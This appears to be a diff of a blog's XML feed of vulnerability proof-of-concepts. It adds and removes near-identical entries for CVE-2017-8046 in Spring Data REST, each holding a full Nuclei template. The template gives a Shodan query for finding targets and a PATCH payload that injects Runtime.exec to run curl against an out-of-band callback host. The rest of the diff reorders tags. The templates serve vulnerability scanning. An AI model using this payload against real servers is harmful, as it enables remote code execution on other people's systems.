@@ -4,6 +4,33 @@
   
   
   <entry>
+    <title>Spring Data REST PATCH Request Remote Code Execution Vulnerability</title>
+    <link href="/2025/06/10/github_2602988520/"/>
+    <url>/2025/06/10/github_2602988520/</url>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Spring Data REST PATCH Request Remote Code Execution Vulnerability</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2017-8046</li></ul><p><strong>漏洞类型：</strong> 反序列化</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> Spring Data REST &lt; 2.6.9和3.0.1，Spring Boot &lt; 1.5.9和2.0 M6存在远程代码执行漏洞，攻击者可以通过发送恶意的PATCH请求，利用特制的JSON数据执行任意Java代码。</p><p><strong>产品厂商：</strong> pivotal_software</p><p><strong>产品名称：</strong> Spring Data REST</p><p><strong>影响版本：</strong> &lt; 2.6.9, &lt; 3.0.1</p><p><strong>搜索语法：</strong> http.title:”eureka”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/820c3bc9924632333f2a355ab0e87ea375f0dc87/http%2Fcves%2F2017%2FCVE-2017-8046.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/820c3bc9924632333f2a355ab0e87ea375f0dc87/http%2Fcves%2F2017%2FCVE-2017-8046.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">201</span>7-<span class="hljs-number">8046</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> Spring Data REST <span class="hljs-operator">&lt;</span> <span class="hljs-number">2.6</span>.<span class="hljs-number">9</span> (Ingalls SR9) <span class="hljs-symbol">/</span> <span class="hljs-number">3.0</span>.<span class="hljs-number">1</span> (Kay SR1) <span class="hljs-operator">-</span> PATCH Request Remote Code Execution<br>  <span class="hljs-params">author:</span> domwhewell-sage<br>  <span class="hljs-params">severity:</span> critical<br>  <span class="hljs-params">description:</span> |<br>    Spring Data REST <span class="hljs-operator">&lt;</span> <span class="hljs-number">2.6</span>.<span class="hljs-number">9</span> and <span class="hljs-number">3.0</span>.<span class="hljs-number">1</span>, Spring Boot <span class="hljs-operator">&lt;</span> <span class="hljs-number">1.5</span>.<span class="hljs-number">9</span> and <span class="hljs-number">2.0</span> M6 contain a remote code execution caused by processing malicious PATCH requests <span class="hljs-keyword">with</span> crafted JSON data, letting attackers execute arbitrary Java code, exploit requires sending malicious PATCH requests.<br>  <span class="hljs-params">impact:</span> |<br>    Malicious PATCH requests submitted to servers using Spring Data REST versions prior to <span class="hljs-number">2.6</span>.<span class="hljs-number">9</span> (Ingalls SR9), versions prior to <span class="hljs-number">3.0</span>.<span class="hljs-number">1</span> (Kay SR1) and Spring Boot versions prior to <span class="hljs-number">1.5</span>.<span class="hljs-number">9</span>, <span class="hljs-number">2.0</span> M6 can use specially crafted JSON data to run arbitrary Java code.<br>  <span class="hljs-params">remediation:</span> |<br>    To remediate this vulnerability, update to Spring Data REST version <span class="hljs-number">2.6</span>.<span class="hljs-number">9</span> <span class="hljs-keyword">or</span> later, <span class="hljs-keyword">or</span> <span class="hljs-number">3.0</span>.<span class="hljs-number">1</span> <span class="hljs-keyword">or</span> later, and Spring Boot version <span class="hljs-number">1.5</span>.<span class="hljs-number">9</span> <span class="hljs-keyword">or</span> later, <span class="hljs-keyword">or</span> <span class="hljs-number">2.0</span> M6 <span class="hljs-keyword">or</span> later.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//nvd.nist.gov/vuln/detail/CVE-2017-8046</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//spring.io/security/cve-2017-8046</span><br>  <span class="hljs-params">classification:</span><br>    <span class="hljs-params">cvss-metrics:</span> CVSS:<span class="hljs-number">3.0</span><span class="hljs-operator">/</span>AV:N<span class="hljs-operator">/</span>AC:L<span class="hljs-operator">/</span>PR:N<span class="hljs-operator">/</span>UI:N<span class="hljs-operator">/</span>S:U<span class="hljs-operator">/</span>C:H<span class="hljs-operator">/</span>I:H<span class="hljs-operator">/</span>A:H<br>    <span class="hljs-params">cvss-score:</span> <span class="hljs-number">9.8</span><br>    <span class="hljs-params">cve-id:</span> CVE-<span class="hljs-number">201</span>7-<span class="hljs-number">8046</span><br>    <span class="hljs-params">cwe-id:</span> CWE-<span class="hljs-number">20</span><br>    <span class="hljs-params">cpe:</span> cpe:<span class="hljs-number">2.3</span>:a:pivotal_software:spring_data_rest:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">vendor:</span> pivotal_software<br>    <span class="hljs-params">product:</span> spring_data_rest<br>    <span class="hljs-params">shodan-query:</span> http.title:<span class="hljs-string">&quot;eureka&quot;</span><br>  <span class="hljs-params">tags:</span> cve,cve2017,pivotal,springboot,pivotal_software<br><br><span class="hljs-params">flow:</span> |<br>  http(<span class="hljs-number">1</span>)<br>  for(<span class="hljs-keyword">let</span> endpoint_urls of iterate(template.endpoints))&#123;<br>    set(<span class="hljs-string">&quot;endpoints&quot;</span>, endpoint_urls)<br>    http(<span class="hljs-number">2</span>)<br>  &#125;<br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">method:</span> GET<br>    <span class="hljs-params">path:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&#123;&#123;BaseURL&#125;&#125;&quot;</span><br><br>    <span class="hljs-params">redirects:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-params">max-redirects:</span> <span class="hljs-number">3</span><br><br>    <span class="hljs-params">matchers-condition:</span> and<br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">internal:</span> <span class="hljs-literal">true</span><br>        <span class="hljs-params">part:</span> header<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;application/json&quot;</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;application/hal+json&quot;</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;application/vnd.spring-boot.actuator&quot;</span><br>        <span class="hljs-params">condition:</span> <span class="hljs-keyword">or</span><br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">internal:</span> <span class="hljs-literal">true</span><br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> &#x27;<span class="hljs-string">&quot;_embedded&quot;</span>&#x27;<br>          <span class="hljs-operator">-</span> &#x27;<span class="hljs-string">&quot;_links&quot;</span>&#x27;<br>          <span class="hljs-operator">-</span> &#x27;<span class="hljs-string">&quot;page&quot;</span>&#x27;<br>          <span class="hljs-operator">-</span> &#x27;<span class="hljs-string">&quot;size&quot;</span>&#x27;<br>        <span class="hljs-params">condition:</span> <span class="hljs-keyword">or</span><br><br>    <span class="hljs-params">extractors:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">name:</span> endpoints<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">group:</span> <span class="hljs-number">1</span><br>        <span class="hljs-params">internal:</span> <span class="hljs-literal">true</span><br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> &#x27;<span class="hljs-string">&quot;href&quot;</span>\s<span class="hljs-operator">*</span>:\s<span class="hljs-operator">*</span><span class="hljs-string">&quot;([^&quot;</span>&#123;]<span class="hljs-operator">+</span>)&#x27;<br><br>  <span class="hljs-operator">-</span> <span class="hljs-params">method:</span> PATCH<br>    <span class="hljs-params">path:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&#123;&#123;endpoints&#125;&#125;/1&quot;</span><br>    <span class="hljs-params">headers:</span><br>      <span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/json-patch+json</span><br>    <span class="hljs-params">body:</span> |<br>      [<br>        &#123;<br>          <span class="hljs-string">&quot;op&quot;</span>: <span class="hljs-string">&quot;replace&quot;</span>,<br>          <span class="hljs-string">&quot;path&quot;</span>: <span class="hljs-string">&quot;T(java.lang.Runtime).getRuntime().exec(<span class="hljs-char escape_">\&quot;</span>curl &#123;&#123;interactsh-url&#125;&#125;<span class="hljs-char escape_">\&quot;</span>).x&quot;</span>,<br>          <span class="hljs-string">&quot;value&quot;</span>: <span class="hljs-string">&quot;CVE-2017-8046&quot;</span><br>        &#125;<br>      ]<br><br>    <span class="hljs-params">matchers-condition:</span> and<br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> interactsh_protocol<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> dns<br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;org.springframework&quot;</span><br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>Github Poc</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>projectdiscovery/nuclei-templates:github issues</tag>
+      
+      <tag>反序列化</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>GeoServer Vulnerable to Unauthenticated SSRF via TestWfsPost</title>
     <link href="/2025/06/10/github_2487733864/"/>
     <url>/2025/06/10/github_2487733864/</url>
@@ -201,9 +228,9 @@
     
     <tags>
       
-      <tag>缓冲区溢出</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>缓冲区溢出</tag>
       
     </tags>
     
@@ -231,33 +258,6 @@
       <tag>mp.weixin.qq.com</tag>
       
       <tag>赛博昆仑CERT</tag>
-      
-    </tags>
-    
-  </entry>
-  
-  
-  
-  <entry>
-    <title>Spring Data REST PATCH请求远程代码执行漏洞</title>
-    <link href="/2025/06/10/github_2602988520/"/>
-    <url>/2025/06/10/github_2602988520/</url>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Spring Data REST PATCH请求远程代码执行漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2017-8046</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> Spring Data REST &lt; 2.6.9和3.0.1，Spring Boot &lt; 1.5.9和2.0 M6存在远程代码执行漏洞，攻击者可以通过发送恶意的PATCH请求，利用精心构造的JSON数据执行任意Java代码。</p><p><strong>产品厂商：</strong> pivotal_software</p><p><strong>产品名称：</strong> Spring Data REST</p><p><strong>影响版本：</strong> &lt; 2.6.9, &lt; 3.0.1</p><p><strong>搜索语法：</strong> http.title:”eureka”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/820c3bc9924632333f2a355ab0e87ea375f0dc87/http%2Fcves%2F2017%2FCVE-2017-8046.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/820c3bc9924632333f2a355ab0e87ea375f0dc87/http%2Fcves%2F2017%2FCVE-2017-8046.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">201</span>7-<span class="hljs-number">8046</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> Spring Data REST <span class="hljs-operator">&lt;</span> <span class="hljs-number">2.6</span>.<span class="hljs-number">9</span> (Ingalls SR9) <span class="hljs-symbol">/</span> <span class="hljs-number">3.0</span>.<span class="hljs-number">1</span> (Kay SR1) <span class="hljs-operator">-</span> PATCH Request Remote Code Execution<br>  <span class="hljs-params">author:</span> domwhewell-sage<br>  <span class="hljs-params">severity:</span> critical<br>  <span class="hljs-params">description:</span> |<br>    Spring Data REST <span class="hljs-operator">&lt;</span> <span class="hljs-number">2.6</span>.<span class="hljs-number">9</span> and <span class="hljs-number">3.0</span>.<span class="hljs-number">1</span>, Spring Boot <span class="hljs-operator">&lt;</span> <span class="hljs-number">1.5</span>.<span class="hljs-number">9</span> and <span class="hljs-number">2.0</span> M6 contain a remote code execution caused by processing malicious PATCH requests <span class="hljs-keyword">with</span> crafted JSON data, letting attackers execute arbitrary Java code, exploit requires sending malicious PATCH requests.<br>  <span class="hljs-params">impact:</span> |<br>    Malicious PATCH requests submitted to servers using Spring Data REST versions prior to <span class="hljs-number">2.6</span>.<span class="hljs-number">9</span> (Ingalls SR9), versions prior to <span class="hljs-number">3.0</span>.<span class="hljs-number">1</span> (Kay SR1) and Spring Boot versions prior to <span class="hljs-number">1.5</span>.<span class="hljs-number">9</span>, <span class="hljs-number">2.0</span> M6 can use specially crafted JSON data to run arbitrary Java code.<br>  <span class="hljs-params">remediation:</span> |<br>    To remediate this vulnerability, update to Spring Data REST version <span class="hljs-number">2.6</span>.<span class="hljs-number">9</span> <span class="hljs-keyword">or</span> later, <span class="hljs-keyword">or</span> <span class="hljs-number">3.0</span>.<span class="hljs-number">1</span> <span class="hljs-keyword">or</span> later, and Spring Boot version <span class="hljs-number">1.5</span>.<span class="hljs-number">9</span> <span class="hljs-keyword">or</span> later, <span class="hljs-keyword">or</span> <span class="hljs-number">2.0</span> M6 <span class="hljs-keyword">or</span> later.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//nvd.nist.gov/vuln/detail/CVE-2017-8046</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//spring.io/security/cve-2017-8046</span><br>  <span class="hljs-params">classification:</span><br>    <span class="hljs-params">cvss-metrics:</span> CVSS:<span class="hljs-number">3.0</span><span class="hljs-operator">/</span>AV:N<span class="hljs-operator">/</span>AC:L<span class="hljs-operator">/</span>PR:N<span class="hljs-operator">/</span>UI:N<span class="hljs-operator">/</span>S:U<span class="hljs-operator">/</span>C:H<span class="hljs-operator">/</span>I:H<span class="hljs-operator">/</span>A:H<br>    <span class="hljs-params">cvss-score:</span> <span class="hljs-number">9.8</span><br>    <span class="hljs-params">cve-id:</span> CVE-<span class="hljs-number">201</span>7-<span class="hljs-number">8046</span><br>    <span class="hljs-params">cwe-id:</span> CWE-<span class="hljs-number">20</span><br>    <span class="hljs-params">cpe:</span> cpe:<span class="hljs-number">2.3</span>:a:pivotal_software:spring_data_rest:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">vendor:</span> pivotal_software<br>    <span class="hljs-params">product:</span> spring_data_rest<br>    <span class="hljs-params">shodan-query:</span> http.title:<span class="hljs-string">&quot;eureka&quot;</span><br>  <span class="hljs-params">tags:</span> cve,cve2017,pivotal,springboot,pivotal_software<br><br><span class="hljs-params">flow:</span> |<br>  http(<span class="hljs-number">1</span>)<br>  for(<span class="hljs-keyword">let</span> endpoint_urls of iterate(template.endpoints))&#123;<br>    set(<span class="hljs-string">&quot;endpoints&quot;</span>, endpoint_urls)<br>    http(<span class="hljs-number">2</span>)<br>  &#125;<br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">method:</span> GET<br>    <span class="hljs-params">path:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&#123;&#123;BaseURL&#125;&#125;&quot;</span><br><br>    <span class="hljs-params">redirects:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-params">max-redirects:</span> <span class="hljs-number">3</span><br><br>    <span class="hljs-params">matchers-condition:</span> and<br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">internal:</span> <span class="hljs-literal">true</span><br>        <span class="hljs-params">part:</span> header<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;application/json&quot;</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;application/hal+json&quot;</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;application/vnd.spring-boot.actuator&quot;</span><br>        <span class="hljs-params">condition:</span> <span class="hljs-keyword">or</span><br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">internal:</span> <span class="hljs-literal">true</span><br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> &#x27;<span class="hljs-string">&quot;_embedded&quot;</span>&#x27;<br>          <span class="hljs-operator">-</span> &#x27;<span class="hljs-string">&quot;_links&quot;</span>&#x27;<br>          <span class="hljs-operator">-</span> &#x27;<span class="hljs-string">&quot;page&quot;</span>&#x27;<br>          <span class="hljs-operator">-</span> &#x27;<span class="hljs-string">&quot;size&quot;</span>&#x27;<br>        <span class="hljs-params">condition:</span> <span class="hljs-keyword">or</span><br><br>    <span class="hljs-params">extractors:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">name:</span> endpoints<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">group:</span> <span class="hljs-number">1</span><br>        <span class="hljs-params">internal:</span> <span class="hljs-literal">true</span><br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> &#x27;<span class="hljs-string">&quot;href&quot;</span>\s<span class="hljs-operator">*</span>:\s<span class="hljs-operator">*</span><span class="hljs-string">&quot;([^&quot;</span>&#123;]<span class="hljs-operator">+</span>)&#x27;<br><br>  <span class="hljs-operator">-</span> <span class="hljs-params">method:</span> PATCH<br>    <span class="hljs-params">path:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&#123;&#123;endpoints&#125;&#125;/1&quot;</span><br>    <span class="hljs-params">headers:</span><br>      <span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/json-patch+json</span><br>    <span class="hljs-params">body:</span> |<br>      [<br>        &#123;<br>          <span class="hljs-string">&quot;op&quot;</span>: <span class="hljs-string">&quot;replace&quot;</span>,<br>          <span class="hljs-string">&quot;path&quot;</span>: <span class="hljs-string">&quot;T(java.lang.Runtime).getRuntime().exec(<span class="hljs-char escape_">\&quot;</span>curl &#123;&#123;interactsh-url&#125;&#125;<span class="hljs-char escape_">\&quot;</span>).x&quot;</span>,<br>          <span class="hljs-string">&quot;value&quot;</span>: <span class="hljs-string">&quot;CVE-2017-8046&quot;</span><br>        &#125;<br>      ]<br><br>    <span class="hljs-params">matchers-condition:</span> and<br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> interactsh_protocol<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> dns<br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;org.springframework&quot;</span><br><br></code></pre></td></tr></table></figure>]]></content>
-    
-    
-    <categories>
-      
-      <category>Github Poc</category>
-      
-    </categories>
-    
-    
-    <tags>
-      
-      <tag>projectdiscovery/nuclei-templates:github issues</tag>
-      
-      <tag>命令执行</tag>
       
     </tags>
     
@@ -1728,9 +1728,9 @@
     
     <tags>
       
-      <tag>缓冲区溢出</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>缓冲区溢出</tag>
       
     </tags>
     
@@ -1917,9 +1917,9 @@
     
     <tags>
       
-      <tag>CVE-2023:github search</tag>
-      
       <tag>其他</tag>
+      
+      <tag>CVE-2023:github search</tag>
       
     </tags>
     
@@ -2052,9 +2052,9 @@
     
     <tags>
       
-      <tag>其他</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>其他</tag>
       
     </tags>
     
@@ -2295,9 +2295,9 @@
     
     <tags>
       
-      <tag>权限绕过</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>权限绕过</tag>
       
     </tags>
     
@@ -2673,9 +2673,9 @@
     
     <tags>
       
-      <tag>其他</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>其他</tag>
       
     </tags>
     
@@ -2862,9 +2862,9 @@
     
     <tags>
       
-      <tag>缓冲区溢出</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>缓冲区溢出</tag>
       
     </tags>
     
@@ -2889,9 +2889,9 @@
     
     <tags>
       
-      <tag>缓冲区溢出</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>缓冲区溢出</tag>
       
     </tags>
     
@@ -2943,9 +2943,9 @@
     
     <tags>
       
-      <tag>其他</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>其他</tag>
       
     </tags>
     
@@ -3105,9 +3105,9 @@
     
     <tags>
       
-      <tag>CVE-2023:github search</tag>
-      
       <tag>其他</tag>
+      
+      <tag>CVE-2023:github search</tag>
       
     </tags>
     
@@ -3510,9 +3510,9 @@
     
     <tags>
       
-      <tag>权限绕过</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>权限绕过</tag>
       
     </tags>
     
@@ -3537,9 +3537,9 @@
     
     <tags>
       
-      <tag>缓冲区溢出</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>缓冲区溢出</tag>
       
     </tags>
     
@@ -4048,9 +4048,9 @@
     
     <tags>
       
-      <tag>其他</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>其他</tag>
       
     </tags>
     
@@ -4075,9 +4075,9 @@
     
     <tags>
       
-      <tag>权限绕过</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>权限绕过</tag>
       
     </tags>
     
@@ -4102,9 +4102,9 @@
     
     <tags>
       
-      <tag>其他</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>其他</tag>
       
     </tags>
     
@@ -4291,9 +4291,9 @@
     
     <tags>
       
-      <tag>跨站可执行脚本</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>跨站可执行脚本</tag>
       
     </tags>
     
@@ -4345,9 +4345,9 @@
     
     <tags>
       
-      <tag>权限绕过</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>权限绕过</tag>
       
     </tags>
     
@@ -4426,9 +4426,9 @@
     
     <tags>
       
-      <tag>其他</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>其他</tag>
       
     </tags>
     
@@ -4858,9 +4858,9 @@
     
     <tags>
       
-      <tag>权限绕过</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>权限绕过</tag>
       
     </tags>
     
@@ -4912,9 +4912,9 @@
     
     <tags>
       
-      <tag>权限绕过</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>权限绕过</tag>
       
     </tags>
     
@@ -4939,9 +4939,9 @@
     
     <tags>
       
-      <tag>其他</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>其他</tag>
       
     </tags>
     
@@ -4966,9 +4966,9 @@
     
     <tags>
       
-      <tag>权限绕过</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>权限绕过</tag>
       
     </tags>
     
@@ -4993,9 +4993,9 @@
     
     <tags>
       
-      <tag>跨站可执行脚本</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>跨站可执行脚本</tag>
       
     </tags>
     
@@ -5128,9 +5128,9 @@
     
     <tags>
       
-      <tag>缓冲区溢出</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>缓冲区溢出</tag>
       
     </tags>
     
@@ -5209,9 +5209,9 @@
     
     <tags>
       
-      <tag>其他</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>其他</tag>
       
     </tags>
     
@@ -5236,9 +5236,9 @@
     
     <tags>
       
-      <tag>缓冲区溢出</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>缓冲区溢出</tag>
       
     </tags>
     
@@ -5560,9 +5560,9 @@
     
     <tags>
       
-      <tag>其他</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>其他</tag>
       
     </tags>
     
@@ -5776,9 +5776,9 @@
     
     <tags>
       
-      <tag>CVE-2023:github search</tag>
-      
       <tag>其他</tag>
+      
+      <tag>CVE-2023:github search</tag>
       
     </tags>
     
